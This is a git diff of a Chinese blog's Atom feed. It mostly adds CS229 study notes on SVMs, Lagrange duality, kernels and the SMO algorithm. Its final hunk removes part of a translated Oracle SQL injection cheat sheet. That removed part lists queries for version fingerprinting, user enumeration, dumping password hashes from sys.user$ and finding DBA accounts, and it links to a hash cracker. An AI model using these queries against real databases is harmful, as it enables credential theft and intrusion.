@@ -4,7 +4,7 @@
   <title><![CDATA[雪地]]></title>
   <link href="http://yinzo.github.io/atom.xml" rel="self"/>
   <link href="http://yinzo.github.io/"/>
-  <updated>2017-05-14T17:00:16+08:00</updated>
+  <updated>2017-06-11T01:51:33+08:00</updated>
   <id>http://yinzo.github.io/</id>
   <author>
     <name><![CDATA[]]></name>
@@ -13,11 +13,430 @@
   <generator uri="http://www.mweb.im/">MWeb</generator>
   
   <entry>
-    <title type="html"><![CDATA[CS229 学习笔记 Part2]]></title>
-    <link href="http://yinzo.github.io/14967660338811.html"/>
-    <updated>2017-06-07T00:20:33+08:00</updated>
-    <id>http://yinzo.github.io/14967660338811.html</id>
+    <title type="html"><![CDATA[CS229 学习笔记 Part3]]></title>
+    <link href="http://yinzo.github.io/14968173531750.html"/>
+    <updated>2017-06-07T14:35:53+08:00</updated>
+    <id>http://yinzo.github.io/14968173531750.html</id>
     <content type="html"><![CDATA[
+<ul>
+<li>
+<a href="#toc_0">SVM</a>
+<ul>
+<li>
+<a href="#toc_1">函数间隔和几何间隔 (Functional and geometric margin)</a>
+</li>
+<li>
+<a href="#toc_2">最优间隔分类器 (Optimal margin classifier)</a>
+</li>
+<li>
+<a href="#toc_3">拉格朗日对偶问题</a>
+<ul>
+<li>
+<a href="#toc_4">原始问题</a>
+</li>
+<li>
+<a href="#toc_5">对偶问题</a>
+</li>
+<li>
+<a href="#toc_6">KKT 条件</a>
+</li>
+</ul>
+</li>
+<li>
+<a href="#toc_7">回到最优间隔分类器问题</a>
+</li>
+<li>
+<a href="#toc_8">核 (Kernels)</a>
+</li>
+<li>
+<a href="#toc_9">正则化</a>
+</li>
+<li>
+<a href="#toc_10">SMO 算法</a>
+<ul>
+<li>
+<a href="#toc_11">坐标上升算法 (Coordinate ascent)</a>
+</li>
+<li>
+<a href="#toc_12">SMO</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+
+<h2 id="toc_0">SVM</h2>
+
+<p>CS229 对于 SVM 的理论解释是我学习到的最详细也是最好的一份资料了，对比对象有周志华《机器学习》、《机器学习实战》、Coursera 上的 Machine Learning 等。相当推荐学习 CS229。</p>
+
+<p>分类间隔 (Margin) 和 SVM 的优化目标『最大化分类间隔』这里就不多说了，很好理解，主要还是记录 CS229 中学到的新内容。一个数据点离分类边界 (decision boundary) 越远，则确信度越高。我们的优化目标也相当于寻找一个远离所有数据点的分类边界，当然，前提是这个分类边界得到的分类都正确。</p>
+
+<p>SVM 的一些特殊定义也提及一下，</p>
+
+<ul>
+<li>\(y\) 的取值不是 \(\{0,1\}\) 而是 \(\{-1,1\}\)。</li>
+<li>假设函数 \(h_{w,b}(x) = g(w^Tx+b)\) 中，我们把截距项单独写出来，便与后续的计算。</li>
+<li>我们的分类器输出结果会直接是 1 或 -1，不像 Logistic 回归那样先输出 \(y\) 是某一类的概率。</li>
+</ul>
+
+<h3 id="toc_1">函数间隔和几何间隔 (Functional and geometric margin)</h3>
+
+<p>函数间隔 \(\hat{\gamma}\) 的定义如下<br/>
+\[\hat{\gamma}^{(i)} = y^{(i)}(w^Tx+b)\]</p>
+
+<p>\[\hat{\gamma} = \min_{i=1,\cdots,m} \hat{\gamma}^{(i)}\]</p>
+
+<p>函数间隔，是所有数据点的函数输出中的最小值，函数间隔越大，说明这个点分类的自信越高。但是可以发现，我们等比例放大参数 \(w\) 和 \(b\) 的数值大小，可以使得函数间隔变大，并且分类间隔直线的位置并不会移动。于是我们又定义了几何间隔</p>
+
+<p><img src="media/14968173531750/14968200759292.jpg" alt=""/></p>
+
+<p>注意图中的点 A，我们需要求 A 到分类边界的距离 \(\gamma^{(i)}\)，就是我们现在需要求的值。</p>
+
+<p>因为 A 代表着 \(x^{(i)}\)， 所以我们可以得到点 B 的公式为 \(x^{(i)} - \gamma^{(i)} \cdot w/||w||\)，并且点 B 在分类边界上，我们有 \(w^Tx+b=0\)，因此</p>
+
+<p>\[w^T\left(x^{(i)}-\gamma^{(i)}\frac{w}{||w||}\right)+b=0\]</p>
+
+<p>\[\gamma^{(i)} = \frac{w^Tx^{(i)}+b}{||w||} = \left(\frac{w}{||w||}\right)^Tx^{(i)}+\frac{b}{||w||}\]</p>
+
+<p>再把函数的正负性考虑进去，最终我们得到</p>
+
+<p>\[\gamma^{(i)} = y^{(i)}\left(\left(\frac{w}{||w||}\right)^Tx^{(i)}+\frac{b}{||w||}\right)\]</p>
+
+<p>注意如果 \(||w|| = 1\)，则函数间隔等于几何间隔——这给了我们一个联系起这两种间隔的思路。并且，几何间隔并不受参数的等比缩放影响，这个特性在后面的推导中很有用。比如说我们在拟合 w 和 b 的时候，我们需要对他进行一个缩放以满足 \(||w|| = 1\) 这个约束，那么我们并不需要担心几何间隔会因此改变。</p>
+
+<p>最后，对于一组大小为 m 的训练集，我们同样定义</p>
+
+<p>\[\gamma = \min_{i=1,\cdots,m}\gamma^{(i)}\]</p>
+
+<h3 id="toc_2">最优间隔分类器 (Optimal margin classifier)</h3>
+
+<p>当我们假设数据是线性可分的时候，也就是存在一个超平面能够将正类和负类分隔开，这时我们如何找到这个最大化集合间隔的分类器呢，有以下优化问题</p>
+
+<p>\[\begin{eqnarray}<br/>
+\max_{\gamma,w,b}&amp;&amp;\gamma \nonumber \\<br/>
+s.t. &amp; &amp;y^{(i)}(w^Tx^{(i)}+b)\geq \gamma,i=1,\cdots,m \nonumber \\<br/>
+&amp;&amp;||w||=1 \nonumber \\<br/>
+\end{eqnarray}\]</p>
+
+<p>我们限制了 \(||w||=1\)，所以几何间隔和函数间隔此时是相等的。因此，解决这个优化问题，我们能够求出对于这个训练集最大的几何间隔。但是，&quot;\(||w||=1\)&ldquo; 这个限制不怎么友好（non-convex），我们无法套用现成的优化求解算法来解决它，所以我们尝试把它变形一下</p>
+
+<p>\[\begin{eqnarray}\max_{\hat{\gamma},w,b} &amp;&amp;\frac{\hat{\gamma}}{||w||} \nonumber \\<br/>
+s.t. &amp;&amp; y^{(i)}(w^Tx^{(i)}+b)\geq \hat{\gamma},\ \ i=1,\cdots,m \nonumber \\<br/>
+\end{eqnarray}\]</p>
+
+<p>现在我们尝试最大化 \(\hat{\gamma}/||w||\)，这个优化问题和上面的那个是等价的，并且我们成功抛弃掉了那个不友好的限制条件。但是，现在变成我们的目标函数不怎么友好了 (non-convex)。</p>
+
+<p>让我们继续尝试变形。回想起我们能够随意等比例缩放 \(w,b\)，这非常关键。我们限制\(\hat{\gamma}=1\)，则我们的优化目标可以变为最大化 \(\hat{\gamma}/||w|| = 1/||w||\)，也就相当于最小化 \(||w||^2\)</p>
+
+<p>\[\begin{eqnarray}<br/>
+\min_{\gamma,w,b} &amp;&amp;\frac{1}{2}||w||^2 \nonumber \\<br/>
+s.t. &amp;&amp; y^{(i)}(w^Tx^{(i)}+b)\geq 1,\ \ i=1,\cdots,m \nonumber \\<br/>
+\end{eqnarray}\]</p>
+
+<p>现在我们终于将问题转化为一个能够使用现成计算包解决的优化问题了。上面的优化问题是一个凸二次优化问题，并且只有一个线性约束。但是相比使用现成计算包直接解决这个优化问题，我们还有一个解决办法，并且解决过程中还引出了更加重要的 kernel 概念。</p>
+
+<h3 id="toc_3">拉格朗日对偶问题</h3>
+
+<h4 id="toc_4">原始问题</h4>
+
+<p>有『等式约束条件』和『不等式约束条件』下的优化问题，能够通过拉格朗日方法，转换为无约束的拉格朗日函数优化问题。<br/>
+比如说<br/>
+\[\begin{eqnarray}<br/>
+\min_w &amp;&amp; f(w)\nonumber \\<br/>
+s.t. &amp;&amp;g_i(w) \leq 0, \ \ i=1,\cdots,k\nonumber \\<br/>
+&amp;&amp;h_i(w)=0, \ \ i=1,\cdots,l \nonumber \\<br/>
+\end{eqnarray}\]<br/>
+通过引入拉格朗日乘数 \(\alpha_i, \beta_i\) ，我们能够得到拉格朗日函数</p>
+
+<p>\[\mathcal{L}(w,\alpha,\beta) = f(w) + \sum^k_{i=1}\alpha_ig_i(w)+\sum^l_{i=1}\beta_i h_i(w)\]</p>
+
+<p>此时，若我们对拉格朗日函数求最大值的优化问题</p>
+
+<p>\[\theta_{\mathcal{P}}(w) = \max_{\alpha,\beta:\alpha_i \geq 0} \mathcal{L}(w,\alpha,\beta)\]</p>
+
+<p>我们发现，当 \(h_i(w)\) 等于零的时候，即 \(w\) 的取值符合原函数约束时，拉格朗日函数等于原函数；当\(w\) 的取值不符合原函数约束时，即 \(h_i(w)\) 不等于零的时候，总能通过使 \(\beta_i\) 等于正无穷或负无穷，使得 \(\theta_{\mathcal{P}}(w)\) 等于正无穷。<br/>
+<img src="media/14968173531750/14968569191696.jpg" alt=""/><br/>
+\[\theta_{\mathcal{P}}(w) = \left\{ <br/>
+\begin{array}{ll}<br/>
+f(w)  &amp; \\<br/>
+ \\<br/>
+\end{array}<br/>
+\right.\]</p>
+
+<p>利用这个性质，我们再对 \(\theta_{\mathcal{P}}(w)\) 函数化为最小值的优化问题，则得到</p>
+
+<p>\[\min_w \theta_{\mathcal{P}}(w) = \min_w \max_{\alpha,\beta:\alpha_i \geq0} \mathcal{L}(w,\alpha,\beta)\]</p>
+
+<p>求解这一个优化问题，我们就将得到在满足原问题约束条件下，对于原目标函数 \(f(w)\) 的最小值优化问题的解，因为不符合约束条件的参数会使得函数变为正无穷，从而被符合约束条件的参数筛选掉。</p>
+
+<p>\[\min_w \max_{\alpha,\beta:\alpha_i \geq0} \mathcal{L}(w,\alpha,\beta)\]</p>
+
+<p>这个优化问题，就称为拉格朗日函数的原始问题 (primal problem)。</p>
+
+<h4 id="toc_5">对偶问题</h4>
+
+<p>那么，对偶问题是什么呢。可以看到，原始问题中有两个最值优化步骤。将这两个最值优化步骤对调一下顺序，就成为了拉格朗日函数的对偶问题 (dual problem)</p>
+
+<p>我们称，原始问题最终求得的最优解为 \(p^*\)，对偶问题的最优解为 \(d^*\)。我们很容易想到</p>
+
+<p>\[d^* = \max_{\alpha,\beta:\alpha_i \geq0} \min_w \mathcal{L}(w,\alpha,\beta) \leq \min_w \max_{\alpha,\beta:\alpha_i \geq0} \mathcal{L}(w,\alpha,\beta) = p^*\]</p>
+
+<p>并且，在一定条件下，我们有</p>
+
+<p>\[d^* = p^*\]</p>
+
+<h4 id="toc_6">KKT 条件</h4>
+
+<p>若满足以下假设，必定存在 \(w^*, \alpha^*, \beta^*\) 是原始问题的解。<br/>
+1. 函数 \(f\) 和 \(g_i\) 都是凸函数<br/>
+2. \(h_i\) 函数是仿射函数（\(h_i\) 满足 \(h_i(w) = a_i^Tw+b_i\) 形式，称 \(h_i\) 为仿射函数 (Affine)）</p>
+
+<p>并且，若 \(w^*, \alpha^*, \beta^*\) 同时满足 <strong>KKT 条件</strong>，则此解同时是对偶问题和原始问题的解。<br/>
+\[\begin{eqnarray}<br/>
+  \frac{\partial}{\partial w_i}\mathcal{L}(w^*,\alpha^*,\beta^*) &amp;=&amp; 0,i=1,\cdots,n     \\<br/>
+  \frac{\partial}{\partial \beta_i}\mathcal{L}(w^*,\alpha^*,\beta^*) &amp;=&amp; 0,i=1,\cdots,l     \\<br/>
+  \alpha_i^*g_i(w^*) &amp;=&amp; 0, i=1,\cdots,k  \\<br/>
+  g_i(w^*) &amp;\leq&amp; 0, i=1,\cdots,k  \\<br/>
+  \alpha^* &amp;\geq&amp; 0, i=1,\cdots,k  \\<br/>
+\end{eqnarray}\]</p>
+
+<h3 id="toc_7">回到最优间隔分类器问题</h3>
+
+<p>现在，我们尝试使用拉格朗日方法来解决我们的最优间隔分类器优化问题</p>
+
+<p>\[\min_{\gamma,w,b} \frac{1}{2} ||w||^2\]<br/>
+\[s.t.\ \ y^{(i)}（w^Tx^{(i)} +b)\geq 1,\ i=1,\cdots,m\]</p>
+
+<p>我们将约束条件化为以下形式</p>
+
+<p>\[g_i(w) = -y^{(i)}(w^Tx^{(i)}+b) + 1 \leq 0\]</p>
+
+<p>则我们根据 KKT 条件中的公式(3)得知，只有当函数间隔恰好等于 1 时，\(g_i(w) = 0\)，\(\alpha_i\) 才有可能大于0. 我们称 \(\alpha_i &gt; 0\) 的数据点为支持向量 (support vectors)，也就是支持向量机的名称由来。并且支持向量的数量一般远少于训练集样本数量，这是后续算法优化的一个很重要的特性。</p>
+
+<p>我们求出原优化问题的拉格朗日函数</p>
+
+<p>\[ \begin{equation} \mathcal{L}(w,b,\alpha) = \frac{1}{2}||w||^2-\sum^m_{i=1}\alpha_i[y^{(i)}(w^Tx^{(i)}+b)-1]  \end{equation} \]</p>
+
+<p>我们求解对偶问题，首先使用 \(w,b\) 为参数，求解拉格朗日函数的最小值。则我们求函数分别对于 \(w,b\) 的偏导数并使其等于零</p>
+
+<p>\[\nabla_w\mathcal{L}(w,b,\alpha) = w-\sum^m_{i=1}\alpha_iy^{(i)}x^{(i)}= 0\]</p>
+
+<p>\[ \begin{equation} w=\sum^m_{i=1}\alpha_iy^{(i)}x^{(i)} \end{equation} \]</p>
+
+<p>\[ \begin{equation} \frac{\partial}{\partial b}\mathcal{L}(w,b,\alpha) = \sum^m_{i=1} \alpha_iy^{(i)}=0\end{equation} \]</p>
+
+<p>然后我们将他们代入原拉格朗日函数中，进行下一步最值求解</p>
+
+<p>\[\mathcal{L}(w,b,\alpha) = \sum^m_{i=1}\alpha_i - \frac{1}{2}\sum^m_{i,j=1}y^{(i)}y^{(j)}\alpha_i\alpha_j(x^{(i)})^Tx^{(j)}\]</p>
+
+<p>需要注意的是，此时 KKT 条件中的公式(5)，以及刚刚求出的公式(8) 成为了现在的最值优化问题的新约束。则我们得到<br/>
+\[\begin{eqnarray}<br/>
+\max_a &amp;&amp;W(\alpha) = \sum^m_{i=1}\alpha_i-\frac{1}{2}\sum^m_{i,j=1}y^{(i)}y^{(j)}\alpha_i\alpha_j\langle x^{(i)},x^{(j)}\rangle \nonumber \\ <br/>
+s.t. &amp;&amp; \alpha_i \geq 0,\ \ i=1,\cdots,m \nonumber \\<br/>
+&amp;&amp;\sum^m_{i=1}\alpha_iy^{(i)} = 0 \nonumber \\<br/>
+\end{eqnarray}\]<br/>
+最终我们求出 \(\alpha_i\) 的最优值，代入到公式(7) 求得 \(w\) 的最优值，再将 \(w, \alpha_i\) 代入原拉格朗日函数公式(6) 中，求得</p>
+
+<p>\[ \begin{equation} b^* = -\frac{\max_{i:y^{(i)}=-1}w^*Tx^{(i)} + \min_{i:y^{(i)}=1} w^{*T}x^{(i)}}{2} \end{equation} \]</p>
+
+<p>则此时我们已经求得了我们原优化问题的最优解，可喜可贺。</p>
+
+<h3 id="toc_8">核 (Kernels)</h3>
+
+<p>还能有什么优化的地方？我们的分类器的可用性还存在一个前提，数据必须线性可分。如果线性不可分呢？我们引入了『核』的概念，用来对输入数据进行一个特征转换。我们定义特征函数</p>
+
+<p>\[\phi(x) = \begin{bmatrix}<br/>
+x\\<br/>
+x^2\\<br/>
+x^3<br/>
+\end{bmatrix}\]</p>
+
+<p>回头看我们的公式(7)，如果将它代入到我们的假设函数 \(w^Tx+b\) 中，我们得到</p>
+
+<p>\[\begin{eqnarray}<br/>
+  w^Tx+b &amp;=&amp; \left( \sum^m_{i=1}\alpha_iy^{(i)}x^{(i)} \right)^Tx+b  \\<br/>
+&amp;=&amp; \sum^m_{i=1}\alpha_iy^{(i)}\langle x^{(i)}, x\rangle  +b  \\<br/>
+\end{eqnarray}\]<br/>
+将假设函数转化成了输入数据和所有支持向量的点积的形式（\(\langle x^{(i)},x\rangle\) 指 \(x^{(i)}\) 和 \(x\) 的点积），于是我们就可以将这个点积替换成一个特征向量的点积了。<br/>
+我们再定义一个关于 \(x^{(i)}\) 和 \(x\) 的函数 \(K(x,z)\)</p>
+
+<p>\[K(x,z) = \phi(x)^T\phi(z)\]</p>
+
+<p>这个函数，我们就称为<strong>核函数</strong>。我们现在只需要将公式(11)中的点积替换成核函数，我们的 SVM 就可以处理非线性可分的数据集了。<br/>
+为什么我们使用核函数，而不是直接套用特征向量的点积呢？让我们看下面一个例子</p>
+
+<p>\[K(x,z) = (x^Tz)^2\]</p>
+
+<p>也可以写成下面这个形式<br/>
+\[\begin{eqnarray}<br/>
+K(x,z) &amp;=&amp; \left(\sum^n_{i=1}x_iz_i \right) \left(\sum^n_{j=1}x_jz_j \right) \nonumber \\<br/>
+&amp;=&amp;\sum^n_{i=1} \sum^n_{j=1}x_ix_jz_iz_j \nonumber \\<br/>
+&amp;=&amp;\sum^n_{i,j=1}(x_ix_j)(z_iz_j)\nonumber \\<br/>
+\end{eqnarray}\]<br/>
+化为特征向量点积的形式，我们可以得到这个核函数对应的特征向量是这个形式的</p>
+
+<p>\[\phi(x) = \begin{bmatrix}<br/>
+x_1x_1\\<br/>
+x_1x_2\\<br/>
+x_1x_3\\<br/>
+x_2x_1\\<br/>
+x_2x_2\\<br/>
+x_2x_3\\<br/>
+x_3x_1\\<br/>
+x_3x_2\\<br/>
+x_3 x_3<br/>
+\end{bmatrix}\]</p>
+
+<p>我们可以发现，直接使用特征向量点积，计算复杂度为 \(O(n^2)\)，而核函数形式的计算复杂度仅为 \(O(n)\)。所以使用核函数，能够大幅优化计算复杂度。</p>
+
+<p>那么，是否所有的函数都能作为核函数呢？当然不是。</p>
+
+<p>假设 \(K\) 是一个合法核函数，并定义核函数矩阵 \(K_{ij} = K(x^{(i)},x^{(j)})\)。</p>
+
+<p>则有 \(K_{ij} = K(x^{(i)},x^{(j)}) =  \phi(x^{(i)})^T\phi(x^{(j)}) = \phi(x^{(j)})^T\phi(x^{(i)}) = K(x^{(j)},x^{(i)}) = K_{ji}\)</p>
+
+<p>所以，<strong>核函数矩阵必须是对称的</strong></p>
+
+<p>然后，我们使用一个任意向量 \(z\)，有</p>
+
+<p>\[\begin{eqnarray} z^TKz &amp;=&amp; \sum_i\sum_jz_iK_{ij}z_j \nonumber \\<br/>
+&amp;=&amp;\sum_i\sum_jz_i \phi(x^{(i)})^T \phi(x^{(j)}) z_j \nonumber \\<br/>
+&amp;=&amp;\sum_i\sum_jz_i \sum_k \phi_k(x^{(i)}) \phi_k(x^{(j)}) z_j \nonumber \\<br/>
+&amp;=&amp;\sum_k\sum_i\sum_j z_i \phi_k(x^{(i)}) \phi_k(x^{(j)}) z_j \nonumber \\<br/>
+&amp;=&amp;\sum_k\left(\sum_i z_i\phi_k(x^{(i)})\right)^2 \nonumber \\<br/>
+&amp;\geq&amp; 0 \nonumber <br/>
+\end{eqnarray}\]</p>
+
+<p>所以，<strong>核函数矩阵</strong>是半正定的。</p>
+
+<p>需要注意的是，核函数的概念并不是专门为 SVM 提出的，它的概念比 SVM 要广得多。实际上你可以将任何学习算法中的点积替换成核函数，就能使得这个学习算法支持高维度特征学习。</p>
+
+<h3 id="toc_9">正则化</h3>
+
+<p>我们的分类器一直以来都有一个限制条件，那就是分类边界必须能够正确的分类所有的样本。我们知道现实中的样本，绝大部分都存在着噪音数据。如果出现了噪音数据，就会导致 SVM 的分类边界很不合理，如下图所示<br/>
+<img src="media/14968173531750/14969181791214.jpg" alt=""/></p>
+
+<p>为了解决这个问题，我们加入了一个 \(l1\) 正则项：</p>
+
+<p>\[\begin{eqnarray}<br/>
+\min_{\gamma,w,b} &amp;&amp;\frac{1}{2}||w|| ^2+C\sum^m_{i=1}\xi_i \nonumber \\<br/>
+s.t. &amp;&amp; y^{(i)}(w^Tx^{(i)}+b)\geq1-\xi_i,i=1,\cdots,m \nonumber \\<br/>
+&amp;&amp; \xi_i\geq0,\ i=1,\cdots,m \nonumber \\<br/>
+\end{eqnarray}\]</p>
+
+<p>这使得样本的函数间隔能够小于1 （甚至为负数）。其中的参数 \(C\) 代表了两个目标权重的权衡：</p>
+
+<ol>
+<li>使所有样本的函数间隔大于1</li>
+<li>最小化 \(||w||^2\)</li>
+</ol>
+
+<p>\(C\) 越大，则优化目标越偏向目标1，即最原始的，强迫所有样本必须分类正确的模型。</p>
+
+<p>在新的优化目标下，我们的 KKT 条件有一点改变：</p>
+
+<p>\[\begin{eqnarray}<br/>
+\alpha_i = 0 &amp;\Rightarrow&amp; y^{(i)}(w^Tx^{(i)}+b)\geq1  \\<br/>
+\alpha_i = C &amp;\Rightarrow&amp; y^{(i)}(w^Tx^{(i)}+b)\leq 1 \\<br/>
+0&lt;\alpha_i &lt;C &amp;\Rightarrow&amp; y^{(i)}(w^Tx^{(i)}+b) = 1 \\<br/>
+\end{eqnarray}\]</p>
+
+<h3 id="toc_10">SMO 算法</h3>
+
+<p>SMO 算法全称 Sequential minimal optimization，提供了一种有效的方法来解决 SVM 的对偶问题。在介绍 SMO 算法之前，我们先了解另一个算法。</p>
+
+<h4 id="toc_11">坐标上升算法 (Coordinate ascent)</h4>
+
+<p>假设你正在尝试解决一个无约束优化问题</p>
+
+<p>\[\max_aW(\alpha_1,\alpha_2,\cdots,\alpha_m)\]</p>
+
+<p>新算法逻辑如下：</p>
+
+<p><img src="media/14968173531750/14970255117856.jpg" alt=""/><br/>
+可以看到在循环的最里层，我们固定了除了 \(\alpha_i\) 以外的所有参数，然后仅通过 \(\alpha_i\) 来优化函数 \(W\)。以下是一个坐标上升算法实战中的情形<br/>
+<img src="media/14968173531750/14970260504690.jpg" alt=""/></p>
+
+<h4 id="toc_12">SMO</h4>
+
+<p>这是我们准备解决的对偶优化问题：</p>
+
+<p>\[\begin{eqnarray}<br/>
+\max_\alpha &amp;&amp;W(\alpha) = \sum^m_{i=1}\alpha_i -\frac{1}{2}\sum^m_{i,j=1}y^{(i)}y^{(j)}\alpha_i\alpha_j\langle x^{(i)},x^{(j)}\rangle \\<br/>
+s.t. &amp;&amp;0\leq \alpha_i \leq C,\ \ i=1,\cdots,m \\ <br/>
+&amp;&amp;\sum^m_{i=1}\alpha_iy^{(i)}=0 \\<br/>
+\end{eqnarray}\]<br/>
+假设我们使 \(\alpha_i\) 都符合公式(16)、(17)的约束。现在，如果我们将 \(\alpha_2,\cdots,\alpha_m\) 都固定，并使用坐标上升算法来尝试优化目标函数，你觉得这能产生效果吗？并不能。因为我们有一个约束是这样的</p>
+
+<p>\[ \alpha_1y^{(1)} = -\sum^m_{i=2}\alpha_iy^{(i)}\]</p>
+
+<p>两边同乘以 \(y^{(1)}\)</p>
+
+<p>\[\alpha_1 = -y^{(1)}\sum^m_{i=2}\alpha_iy^{(i)}\]<br/>
+因此，如果你固定了 \(\alpha_2,\cdots,\alpha_m\)，实际上你也固定了 \(\alpha_1\)。所以如果我们需要通过 \(\alpha_i\) 来优化目标函数，我们需要同时使用其中的两项来进行优化，也就是我们 SMO 算法的主要思想<br/>
+<img src="media/14968173531750/14970275107451.jpg" alt=""/></p>
+
+<p>我们使用 SMO 算法有一个重要的原因，那就是 \(\alpha_i, \alpha_j\) 的计算非常简单。</p>
+
+<p>首先，我们通过计算剩余项的和，可以写出以下约束</p>
+
+<p>\[\alpha_1y^{(1)}+\alpha_2y^{(2)}=-\sum^m_{i=3}\alpha_iy^{(i)}\]<br/>
+使等号右边等于一个常数 \(\zeta\)，则我们有</p>
+
+<p>\[ \begin{equation}\alpha_1y^{(1)}+\alpha_2y^{(2)} = \zeta \end{equation} \]<br/>
+并且，根据新的 KKT 条件公式(12-14) \(\alpha_i\) 的取值范围被固定在了 \([0,C]\)，则我们可以画出以下图像<br/>
+<img src="media/14968173531750/14970286141343.jpg" alt=""/></p>
+
+<p>并且根据公式(18) ，我们发现能够将原优化目标写成以下形式的二次函数<br/>
+\[a\alpha_2^2 + b\alpha_2+c\]</p>
+
+<p>则我们先计算得出 \(\alpha_2\) 的最优值，再根据上图的值域限制进行一个修建 (clip)<br/>
+<img src="media/14968173531750/14970845058858.jpg" alt=""/><br/>
+以此得到符合限制条件的新 \(\alpha_2\) 值。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CS229 学习笔记 Part2]]></title>
+    <link href="http://yinzo.github.io/14965964854250.html"/>
+    <updated>2017-06-05T01:14:45+08:00</updated>
+    <id>http://yinzo.github.io/14965964854250.html</id>
+    <content type="html"><![CDATA[
+<ul>
+<li>
+<a href="#toc_0">判别式和生成式</a>
+<ul>
+<li>
+<a href="#toc_1">判别式</a>
+</li>
+<li>
+<a href="#toc_2">生成式</a>
+</li>
+</ul>
+</li>
+<li>
+<a href="#toc_3">Gaussian discriminant analysis</a>
+</li>
+<li>
+<a href="#toc_4">讨论：GDA 和 Logistic 回归</a>
+</li>
+<li>
+<a href="#toc_5">朴素贝叶斯</a>
+<ul>
+<li>
+<a href="#toc_6">拉普拉斯平滑</a>
+</li>
+<li>
+<a href="#toc_7">用于文本分类的事件模型</a>
+</li>
+</ul>
+</li>
+</ul>
+
+
 <h2 id="toc_0">判别式和生成式</h2>
 
 <p>对于一个分类任务，判别式和生成式分别代表了两种不同的思路：</p>
@@ -129,7 +548,7 @@
 
 <p>\[p(z=j) = \phi_j = \frac{\sum^m_{i=1} \operatorname{1}\{z^{(i)}=j\}}{m}\]</p>
 
-<p>我们想要让这个式子不等于零，很直觉的办法是在分子上加上一个很小的数。所以我们在分子上加一个 1。但是这还不够，我们需要让多项式分布的各个类整体概率和仍然为 1，即 \(\sum^k_{j=1}\phi_j = 1\) 。所以我们分母也需要稍作改动，最终我们得到</p>
+<p>我们想要让这个式子不等于零，很直觉的办法是在分子上加上一个很小的数。所以我们在分子上加一个 1。但是这还不够，我们需要让多项式分布的各个类整体概率和仍然为 1，即 \(\sum^k_{j=1}\phi_j = 1\)，\(k\) 是多项式分布可选的类的数量。所以我们分母也需要稍作改动，最终我们得到</p>
 
 <p>\[p(z=j) = \phi_j = \frac{\sum^m_{i=1} \operatorname{1}\{z^{(i)}=j\}+1}{m+k}\]</p>
 
@@ -183,11 +602,42 @@
   
   <entry>
     <title type="html"><![CDATA[CS229 学习笔记 Part 1]]></title>
-    <link href="http://yinzo.github.io/14947523529684.html"/>
-    <updated>2017-05-14T16:59:12+08:00</updated>
-    <id>http://yinzo.github.io/14947523529684.html</id>
+    <link href="http://yinzo.github.io/14946020792948.html"/>
+    <updated>2017-05-12T23:14:39+08:00</updated>
+    <id>http://yinzo.github.io/14946020792948.html</id>
     <content type="html"><![CDATA[
 <p>此笔记为我的 CS229 的学习笔记之一，由 Andrew Ng 的 CS229 Lecture notes 和 课堂录像整理而来。用于记录所学到的内容。记录顺序重新编排过，并非是课程原本的教学顺序，并且省略了课程中的一些推导过程，所以适合学习后整理备忘使用，不适合用于同步辅助学习。</p>
+
+<ul>
+<li>
+<a href="#toc_0">广义线性模型 GLM (Generalized Linear Models)</a>
+<ul>
+<li>
+<a href="#toc_1">具体步骤</a>
+</li>
+</ul>
+</li>
+<li>
+<a href="#toc_2">优化方法</a>
+<ul>
+<li>
+<a href="#toc_3">梯度下降法</a>
+</li>
+<li>
+<a href="#toc_4">牛顿法</a>
+</li>
+</ul>
+</li>
+<li>
+<a href="#toc_5">Linear Regression</a>
+<ul>
+<li>
+<a href="#toc_6">Locally weighted linear regression</a>
+</li>
+</ul>
+</li>
+</ul>
+
 
 <h2 id="toc_0">广义线性模型 GLM (Generalized Linear Models)</h2>
 
@@ -2570,224 +3020,6 @@ ip-&gt;com_A-&gt;op
 <p><img src="http://ww4.sinaimg.cn/mw690/7d52f1ffgw1evo7to77eaj21kw16o10g.jpg" alt="环境"/></p>
 
 <p>2015.09.02</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Oracle注入速查表]]></title>
-    <link href="http://yinzo.github.io/14608288508524.html"/>
-    <updated>2016-04-17T01:47:30+08:00</updated>
-    <id>http://yinzo.github.io/14608288508524.html</id>
-    <content type="html"><![CDATA[
-<p><small>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></small></p>
-
-<p>注：下面的一部分查询只能由admin执行，我会在查询的末尾以&quot;<strong><code>-priv</code></strong>&ldquo;标注。</p>
-
-<span id="more"></span><!-- more -->
-
-<p>探测版本：</p>
-
-<pre><code>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
-SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
-SELECT version FROM v$instance;
-</code></pre>
-
-<p>注释：</p>
-
-<pre><code>SELECT 1 FROM dual — comment
-</code></pre>
-
-<p><em>注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’</em></p>
-
-<p>当前用户：</p>
-
-<pre><code>SELECT user FROM dual
-</code></pre>
-
-<p>列出所有用户：</p>
-
-<pre><code>SELECT username FROM all_users ORDER BY username;
-SELECT name FROM sys.user$; — priv
-</code></pre>
-
-<p>列出密码哈希：</p>
-
-<pre><code>SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.  astatus能够在acct被锁定的状态下给你反馈
-SELECT name,spare4 FROM sys.user$ — priv, 11g
-</code></pre>
-
-<p>密码破解：</p>
-
-<p><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a>能够把Oracle8,9,10的基于DES的哈希破解掉</p>
-
-<p>列出权限：</p>
-
-<pre><code>SELECT * FROM session_privs; —当前用户的权限
-SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
-SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
-SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
-</code></pre>
-
-<p>列出DBA账户：</p>
-
-<pre><code>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限
-</code></pre>
-
-<p>当前数据库：</p>
-
